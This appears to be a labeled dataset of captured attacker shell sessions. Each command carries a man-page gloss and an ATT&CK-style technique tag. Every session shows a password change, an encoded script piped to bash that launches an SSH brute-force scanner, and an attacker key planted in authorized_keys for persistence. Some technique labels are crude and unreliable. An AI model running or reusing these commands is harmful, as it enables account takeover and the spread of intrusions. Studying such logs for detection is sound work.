@@ -1,0 +1,551 @@
+Session ID: 246820ce25d4
+cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
+echo -e "sysmail\nGSZYg4u6KsHM\nGSZYg4u6KsHM"|passwd|bash	display a line of text	Masquerading
+echo "sysmail\nGSZYg4u6KsHM\nGSZYg4u6KsHM\n"|passwd	display a line of text	Masquerading
+echo "321" > /var/tmp/.var03522123	display a line of text	Masquerading
+rm -rf /var/tmp/.var03522123	remove files or directories	Indicator Removal
+cat /var/tmp/.var03522123 | head -n 1	concatenate files and print on the standard output	Automated Collection
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9	concatenate files and print on the standard output	Automated Collection
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'	Display amount of free and used memory in the system	System Information Discovery
+ls -lh $(which ls)	list directory contents	File and Directory Discovery
+crontab -l	maintain crontab files for individual users (Vixie Cron)	Scheduled Task/Job
+w	Show who is logged on and what they are doing	System Owner/User Discovery
+uname -m	print system information	System Information Discovery
+cat /proc/cpuinfo | grep model | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
+top	display Linux processes	Process Discovery
+uname	print system information	System Information Discovery
+uname -a	print system information	System Information Discovery
+lscpu | grep Model	display information about the CPU architecture	System Information Discovery
+echo "admin sysmail" > /tmp/up.txt	display a line of text	Masquerading
+rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
+cat /var/tmp/.systemcache436621	concatenate files and print on the standard output	Automated Collection
+echo "1" > /var/tmp/.systemcache436621	display a line of text	Masquerading
+cat /var/tmp/.systemcache436621	concatenate files and print on the standard output	Automated Collection
+sleep 15s	delay for a specified amount of time	Virtualization/Sandbox Evasion
+echo "IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApybSAtcmYgLlgxOS11bml4Cm1rZGlyIC5YMTktdW5peApjZCAuWDE5LXVuaXgKbXYgL3Zhci90bXAvZG90YTMudGFyLmd6IGRvdGEzLnRhci5negp0YXIgeGYgZG90YTMudGFyLmd6CnNsZWVwIDNzICYmIGNkIC90bXAvLlgxOS11bml4Ly5yc3luYy9jCm5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxOTIuMTY4ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDhtICYmIG5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxNzIuMTYgPj4gL2Rldi9udWxsIDI+MSYKc2xlZXAgMjBtICYmIGNkIC4uOyAvdG1wLy5YMTktdW5peC8ucnN5bmMvaW5pdGFsbCAyPjEmCmV4aXQgMA==" | base64 --decode | bash	display a line of text	Masquerading
+rm -rf .ssh	remove files or directories	Indicator Removal
+mkdir .ssh	make directories	Data Staged
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys	display a line of text	Masquerading
+chmod -R go= ~/.ssh	change file mode bits	Obfuscated Files or Information
+whoami	print effective userid	System Owner/User Discovery
+
+- Mapping:		System Owner/User Discovery
+- Mapping:		Scheduled Task/Job
+
+Session ID: d5591413ca96
+cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
+echo -e "admin1234\nEiF59InyvDPo\nEiF59InyvDPo"|passwd|bash	display a line of text	Masquerading
+echo "admin1234\nEiF59InyvDPo\nEiF59InyvDPo\n"|passwd	display a line of text	Masquerading
+echo "321" > /var/tmp/.var03522123	display a line of text	Masquerading
+rm -rf /var/tmp/.var03522123	remove files or directories	Indicator Removal
+cat /var/tmp/.var03522123 | head -n 1	concatenate files and print on the standard output	Automated Collection
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9	concatenate files and print on the standard output	Automated Collection
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'	Display amount of free and used memory in the system	System Information Discovery
+ls -lh $(which ls)	list directory contents	File and Directory Discovery
+crontab -l	maintain crontab files for individual users (Vixie Cron)	Scheduled Task/Job
+w	Show who is logged on and what they are doing	System Owner/User Discovery
+uname -m	print system information	System Information Discovery
+cat /proc/cpuinfo | grep model | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
+top	display Linux processes	Process Discovery
+uname	print system information	System Information Discovery
+uname -a	print system information	System Information Discovery
+lscpu | grep Model	display information about the CPU architecture	System Information Discovery
+echo "admin admin1234" > /tmp/up.txt	display a line of text	Masquerading
+rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
+cat /var/tmp/.systemcache436621	concatenate files and print on the standard output	Automated Collection
+echo "1" > /var/tmp/.systemcache436621	display a line of text	Masquerading
+cat /var/tmp/.systemcache436621	concatenate files and print on the standard output	Automated Collection
+sleep 15s	delay for a specified amount of time	Virtualization/Sandbox Evasion
+echo "IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApybSAtcmYgLlgxOS11bml4Cm1rZGlyIC5YMTktdW5peApjZCAuWDE5LXVuaXgKbXYgL3Zhci90bXAvZG90YTMudGFyLmd6IGRvdGEzLnRhci5negp0YXIgeGYgZG90YTMudGFyLmd6CnNsZWVwIDNzICYmIGNkIC90bXAvLlgxOS11bml4Ly5yc3luYy9jCm5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxOTIuMTY4ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDhtICYmIG5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxNzIuMTYgPj4gL2Rldi9udWxsIDI+MSYKc2xlZXAgMjBtICYmIGNkIC4uOyAvdG1wLy5YMTktdW5peC8ucnN5bmMvaW5pdGFsbCAyPjEmCmV4aXQgMA==" | base64 --decode | bash	display a line of text	Masquerading
+rm -rf .ssh	remove files or directories	Indicator Removal
+mkdir .ssh	make directories	Data Staged
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys	display a line of text	Masquerading
+chmod -R go= ~/.ssh	change file mode bits	Obfuscated Files or Information
+whoami	print effective userid	System Owner/User Discovery
+
+- Mapping:		System Owner/User Discovery
+- Mapping:		Scheduled Task/Job
+
+Session ID: f4b920ff50ea
+cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
+echo -e "admin1234\nEiF59InyvDPo\nEiF59InyvDPo"|passwd|bash	display a line of text	Masquerading
+echo "admin1234\nEiF59InyvDPo\nEiF59InyvDPo\n"|passwd	display a line of text	Masquerading
+echo "321" > /var/tmp/.var03522123	display a line of text	Masquerading
+rm -rf /var/tmp/.var03522123	remove files or directories	Indicator Removal
+cat /var/tmp/.var03522123 | head -n 1	concatenate files and print on the standard output	Automated Collection
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9	concatenate files and print on the standard output	Automated Collection
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'	Display amount of free and used memory in the system	System Information Discovery
+ls -lh $(which ls)	list directory contents	File and Directory Discovery
+crontab -l	maintain crontab files for individual users (Vixie Cron)	Scheduled Task/Job
+w	Show who is logged on and what they are doing	System Owner/User Discovery
+uname -m	print system information	System Information Discovery
+cat /proc/cpuinfo | grep model | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
+top	display Linux processes	Process Discovery
+uname	print system information	System Information Discovery
+uname -a	print system information	System Information Discovery
+lscpu | grep Model	display information about the CPU architecture	System Information Discovery
+echo "admin admin1234" > /tmp/up.txt	display a line of text	Masquerading
+rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
+cat /var/tmp/.systemcache436621	concatenate files and print on the standard output	Automated Collection
+echo "1" > /var/tmp/.systemcache436621	display a line of text	Masquerading
+cat /var/tmp/.systemcache436621	concatenate files and print on the standard output	Automated Collection
+sleep 15s	delay for a specified amount of time	Virtualization/Sandbox Evasion
+echo "IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApybSAtcmYgLlgxOS11bml4Cm1rZGlyIC5YMTktdW5peApjZCAuWDE5LXVuaXgKbXYgL3Zhci90bXAvZG90YTMudGFyLmd6IGRvdGEzLnRhci5negp0YXIgeGYgZG90YTMudGFyLmd6CnNsZWVwIDNzICYmIGNkIC90bXAvLlgxOS11bml4Ly5yc3luYy9jCm5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxOTIuMTY4ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDhtICYmIG5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxNzIuMTYgPj4gL2Rldi9udWxsIDI+MSYKc2xlZXAgMjBtICYmIGNkIC4uOyAvdG1wLy5YMTktdW5peC8ucnN5bmMvaW5pdGFsbCAyPjEmCmV4aXQgMA==" | base64 --decode | bash	display a line of text	Masquerading
+rm -rf .ssh	remove files or directories	Indicator Removal
+mkdir .ssh	make directories	Data Staged
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys	display a line of text	Masquerading
+chmod -R go= ~/.ssh	change file mode bits	Obfuscated Files or Information
+whoami	print effective userid	System Owner/User Discovery
+
+- Mapping:		System Owner/User Discovery
+- Mapping:		Scheduled Task/Job
+
+Session ID: f01ab9cc6600
+cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
+echo -e "admin1234\nEiF59InyvDPo\nEiF59InyvDPo"|passwd|bash	display a line of text	Masquerading
+echo "admin1234\nEiF59InyvDPo\nEiF59InyvDPo\n"|passwd	display a line of text	Masquerading
+echo "321" > /var/tmp/.var03522123	display a line of text	Masquerading
+rm -rf /var/tmp/.var03522123	remove files or directories	Indicator Removal
+cat /var/tmp/.var03522123 | head -n 1	concatenate files and print on the standard output	Automated Collection
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9	concatenate files and print on the standard output	Automated Collection
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'	Display amount of free and used memory in the system	System Information Discovery
+ls -lh $(which ls)	list directory contents	File and Directory Discovery
+crontab -l	maintain crontab files for individual users (Vixie Cron)	Scheduled Task/Job
+w	Show who is logged on and what they are doing	System Owner/User Discovery
+uname -m	print system information	System Information Discovery
+cat /proc/cpuinfo | grep model | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
+top	display Linux processes	Process Discovery
+uname	print system information	System Information Discovery
+uname -a	print system information	System Information Discovery
+lscpu | grep Model	display information about the CPU architecture	System Information Discovery
+echo "admin admin1234" > /tmp/up.txt	display a line of text	Masquerading
+rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
+cat /var/tmp/.systemcache436621	concatenate files and print on the standard output	Automated Collection
+echo "1" > /var/tmp/.systemcache436621	display a line of text	Masquerading
+cat /var/tmp/.systemcache436621	concatenate files and print on the standard output	Automated Collection
+sleep 15s	delay for a specified amount of time	Virtualization/Sandbox Evasion
+echo "IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApybSAtcmYgLlgxOS11bml4Cm1rZGlyIC5YMTktdW5peApjZCAuWDE5LXVuaXgKbXYgL3Zhci90bXAvZG90YTMudGFyLmd6IGRvdGEzLnRhci5negp0YXIgeGYgZG90YTMudGFyLmd6CnNsZWVwIDNzICYmIGNkIC90bXAvLlgxOS11bml4Ly5yc3luYy9jCm5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxOTIuMTY4ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDhtICYmIG5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxNzIuMTYgPj4gL2Rldi9udWxsIDI+MSYKc2xlZXAgMjBtICYmIGNkIC4uOyAvdG1wLy5YMTktdW5peC8ucnN5bmMvaW5pdGFsbCAyPjEmCmV4aXQgMA==" | base64 --decode | bash	display a line of text	Masquerading
+rm -rf .ssh	remove files or directories	Indicator Removal
+mkdir .ssh	make directories	Data Staged
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys	display a line of text	Masquerading
+chmod -R go= ~/.ssh	change file mode bits	Obfuscated Files or Information
+whoami	print effective userid	System Owner/User Discovery
+
+- Mapping:		System Owner/User Discovery
+- Mapping:		Scheduled Task/Job
+
+Session ID: 9d573bbc25ab
+cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
+echo -e "654321\nMDNMtYcnbX53\nMDNMtYcnbX53"|passwd|bash	display a line of text	Masquerading
+echo "654321\nMDNMtYcnbX53\nMDNMtYcnbX53\n"|passwd	display a line of text	Masquerading
+echo "321" > /var/tmp/.var03522123	display a line of text	Masquerading
+rm -rf /var/tmp/.var03522123	remove files or directories	Indicator Removal
+cat /var/tmp/.var03522123 | head -n 1	concatenate files and print on the standard output	Automated Collection
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9	concatenate files and print on the standard output	Automated Collection
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'	Display amount of free and used memory in the system	System Information Discovery
+ls -lh $(which ls)	list directory contents	File and Directory Discovery
+crontab -l	maintain crontab files for individual users (Vixie Cron)	Scheduled Task/Job
+w	Show who is logged on and what they are doing	System Owner/User Discovery
+uname -m	print system information	System Information Discovery
+cat /proc/cpuinfo | grep model | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
+top	display Linux processes	Process Discovery
+uname	print system information	System Information Discovery
+uname -a	print system information	System Information Discovery
+lscpu | grep Model	display information about the CPU architecture	System Information Discovery
+echo "admin 654321" > /tmp/up.txt	display a line of text	Masquerading
+rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
+cat /var/tmp/.systemcache436621	concatenate files and print on the standard output	Automated Collection
+echo "1" > /var/tmp/.systemcache436621	display a line of text	Masquerading
+cat /var/tmp/.systemcache436621	concatenate files and print on the standard output	Automated Collection
+sleep 15s	delay for a specified amount of time	Virtualization/Sandbox Evasion
+echo "IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApybSAtcmYgLlgxOS11bml4Cm1rZGlyIC5YMTktdW5peApjZCAuWDE5LXVuaXgKbXYgL3Zhci90bXAvZG90YTMudGFyLmd6IGRvdGEzLnRhci5negp0YXIgeGYgZG90YTMudGFyLmd6CnNsZWVwIDNzICYmIGNkIC90bXAvLlgxOS11bml4Ly5yc3luYy9jCm5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxOTIuMTY4ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDhtICYmIG5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxNzIuMTYgPj4gL2Rldi9udWxsIDI+MSYKc2xlZXAgMjBtICYmIGNkIC4uOyAvdG1wLy5YMTktdW5peC8ucnN5bmMvaW5pdGFsbCAyPjEmCmV4aXQgMA==" | base64 --decode | bash	display a line of text	Masquerading
+rm -rf .ssh	remove files or directories	Indicator Removal
+mkdir .ssh	make directories	Data Staged
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys	display a line of text	Masquerading
+chmod -R go= ~/.ssh	change file mode bits	Obfuscated Files or Information
+whoami	print effective userid	System Owner/User Discovery
+
+- Mapping:		System Owner/User Discovery
+- Mapping:		Scheduled Task/Job
+
+Session ID: a623a2f15f45
+cat /proc/cpuinfo | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
+echo -e "654321\nuo3wthcisbwY\nuo3wthcisbwY"|passwd|bash	display a line of text	Masquerading
+echo "654321\nuo3wthcisbwY\nuo3wthcisbwY\n"|passwd	display a line of text	Masquerading
+echo "321" > /var/tmp/.var03522123	display a line of text	Masquerading
+rm -rf /var/tmp/.var03522123	remove files or directories	Indicator Removal
+cat /var/tmp/.var03522123 | head -n 1	concatenate files and print on the standard output	Automated Collection
+cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9	concatenate files and print on the standard output	Automated Collection
+free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'	Display amount of free and used memory in the system	System Information Discovery
+ls -lh $(which ls)	list directory contents	File and Directory Discovery
+crontab -l	maintain crontab files for individual users (Vixie Cron)	Scheduled Task/Job
+w	Show who is logged on and what they are doing	System Owner/User Discovery
+uname -m	print system information	System Information Discovery
+cat /proc/cpuinfo | grep model | grep name | wc -l	concatenate files and print on the standard output	Automated Collection
+top	display Linux processes	Process Discovery
+uname	print system information	System Information Discovery
+uname -a	print system information	System Information Discovery
+lscpu | grep Model	display information about the CPU architecture	System Information Discovery
+echo "admin 654321" > /tmp/up.txt	display a line of text	Masquerading
+rm -rf /var/tmp/dota*	remove files or directories	Indicator Removal
+cat /var/tmp/.systemcache436621	concatenate files and print on the standard output	Automated Collection
+echo "1" > /var/tmp/.systemcache436621	display a line of text	Masquerading
+cat /var/tmp/.systemcache436621	concatenate files and print on the standard output	Automated Collection
+sleep 15s	delay for a specified amount of time	Virtualization/Sandbox Evasion
+echo "IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApybSAtcmYgLlgxOS11bml4Cm1rZGlyIC5YMTktdW5peApjZCAuWDE5LXVuaXgKbXYgL3Zhci90bXAvZG90YTMudGFyLmd6IGRvdGEzLnRhci5negp0YXIgeGYgZG90YTMudGFyLmd6CnNsZWVwIDNzICYmIGNkIC90bXAvLlgxOS11bml4Ly5yc3luYy9jCm5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxOTIuMTY4ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDhtICYmIG5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxNzIuMTYgPj4gL2Rldi9udWxsIDI+MSYKc2xlZXAgMjBtICYmIGNkIC4uOyAvdG1wLy5YMTktdW5peC8ucnN5bmMvaW5pdGFsbCAyPjEmCmV4aXQgMA==" | base64 --decode | bash	display a line of text	Masquerading
+rm -rf .ssh	remove files or directories	Indicator Removal
+mkdir .ssh	make directories	Data Staged
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys	display a line of text	Masquerading
+chmod -R go= ~/.ssh	change file mode bits	Obfuscated Files or Information
+whoami	print effective userid	System Owner/User Discovery
+
+- Mapping:		System Owner/User Discovery
+- Mapping:		Scheduled Task/Job
+
+Session ID: 246820ce25d4
+cat	concatenate files and print on the standard output	Automated Collection
+proc	process information pseudo-filesystem	File and Directory Discovery
+grep	print lines that match patterns	Automated Collection
+wc	print newline, word, and byte counts for each file	File and Directory Discovery
+echo	display a line of text	Masquerading
+passwd	change user password	Modify Authentication Process
+bash	GNU Bourne-Again SHell	Command and Scripting Interpreter
+echo	display a line of text	Masquerading
+passwd	change user password	Modify Authentication Process
+echo	display a line of text	Masquerading
+rm	remove files or directories	Indicator Removal
+cat	concatenate files and print on the standard output	Automated Collection
+head	output the first part of files	File and Directory Discovery
+cat	concatenate files and print on the standard output	Automated Collection
+proc	process information pseudo-filesystem	File and Directory Discovery
+grep	print lines that match patterns	Automated Collection
+head	output the first part of files	File and Directory Discovery
+awk	pattern scanning and processing language	Obfuscated Files or Information
+free	Display amount of free and used memory in the system	System Information Discovery
+grep	print lines that match patterns	Automated Collection
+awk	pattern scanning and processing language	Obfuscated Files or Information
+ls	list directory contents	File and Directory Discovery
+which	locate a command	File and Directory Discovery
+crontab	maintain crontab files for individual users (Vixie Cron)	Scheduled Task/Job
+w	Show who is logged on and what they are doing	System Owner/User Discovery
+uname	print system information	System Information Discovery
+cat	concatenate files and print on the standard output	Automated Collection
+proc	process information pseudo-filesystem	File and Directory Discovery
+grep	print lines that match patterns	Automated Collection
+grep	print lines that match patterns	Automated Collection
+wc	print newline, word, and byte counts for each file	File and Directory Discovery
+top	display Linux processes	Process Discovery
+uname	print system information	System Information Discovery
+uname	print system information	System Information Discovery
+lscpu	display information about the CPU architecture	System Information Discovery
+grep	print lines that match patterns	Automated Collection
+echo	display a line of text	Masquerading
+rm	remove files or directories	Indicator Removal
+cat	concatenate files and print on the standard output	Automated Collection
+echo	display a line of text	Masquerading
+cat	concatenate files and print on the standard output	Automated Collection
+sleep	delay for a specified amount of time	Virtualization/Sandbox Evasion
+echo	display a line of text	Masquerading
+base64	base64 encode/decode data and print to standard output	Deobfuscate/Decode Files or Information
+bash	GNU Bourne-Again SHell	Command and Scripting Interpreter
+rm	remove files or directories	Indicator Removal
+mkdir	make directories	Data Staged
+echo	display a line of text	Masquerading
+chmod	change file mode bits	Obfuscated Files or Information
+whoami	print effective userid	System Owner/User Discovery
+
+- Mapping:		System Owner/User Discovery
+- Mapping:		Scheduled Task/Job
+- Mapping:		Modify Authentication Process
+- Mapping:		Brute Force
+- Mapping:		Account Access Removal
+
+Session ID: d5591413ca96
+cat	concatenate files and print on the standard output	Automated Collection
+proc	process information pseudo-filesystem	File and Directory Discovery
+grep	print lines that match patterns	Automated Collection
+wc	print newline, word, and byte counts for each file	File and Directory Discovery
+echo	display a line of text	Masquerading
+passwd	change user password	Modify Authentication Process
+bash	GNU Bourne-Again SHell	Command and Scripting Interpreter
+echo	display a line of text	Masquerading
+passwd	change user password	Modify Authentication Process
+echo	display a line of text	Masquerading
+rm	remove files or directories	Indicator Removal
+cat	concatenate files and print on the standard output	Automated Collection
+head	output the first part of files	File and Directory Discovery
+cat	concatenate files and print on the standard output	Automated Collection
+proc	process information pseudo-filesystem	File and Directory Discovery
+grep	print lines that match patterns	Automated Collection
+head	output the first part of files	File and Directory Discovery
+awk	pattern scanning and processing language	Obfuscated Files or Information
+free	Display amount of free and used memory in the system	System Information Discovery
+grep	print lines that match patterns	Automated Collection
+awk	pattern scanning and processing language	Obfuscated Files or Information
+ls	list directory contents	File and Directory Discovery
+which	locate a command	File and Directory Discovery
+crontab	maintain crontab files for individual users (Vixie Cron)	Scheduled Task/Job
+w	Show who is logged on and what they are doing	System Owner/User Discovery
+uname	print system information	System Information Discovery
+cat	concatenate files and print on the standard output	Automated Collection
+proc	process information pseudo-filesystem	File and Directory Discovery
+grep	print lines that match patterns	Automated Collection
+grep	print lines that match patterns	Automated Collection
+wc	print newline, word, and byte counts for each file	File and Directory Discovery
+top	display Linux processes	Process Discovery
+uname	print system information	System Information Discovery
+uname	print system information	System Information Discovery
+lscpu	display information about the CPU architecture	System Information Discovery
+grep	print lines that match patterns	Automated Collection
+echo	display a line of text	Masquerading
+rm	remove files or directories	Indicator Removal
+cat	concatenate files and print on the standard output	Automated Collection
+echo	display a line of text	Masquerading
+cat	concatenate files and print on the standard output	Automated Collection
+sleep	delay for a specified amount of time	Virtualization/Sandbox Evasion
+echo	display a line of text	Masquerading
+base64	base64 encode/decode data and print to standard output	Deobfuscate/Decode Files or Information
+bash	GNU Bourne-Again SHell	Command and Scripting Interpreter
+rm	remove files or directories	Indicator Removal
+mkdir	make directories	Data Staged
+echo	display a line of text	Masquerading
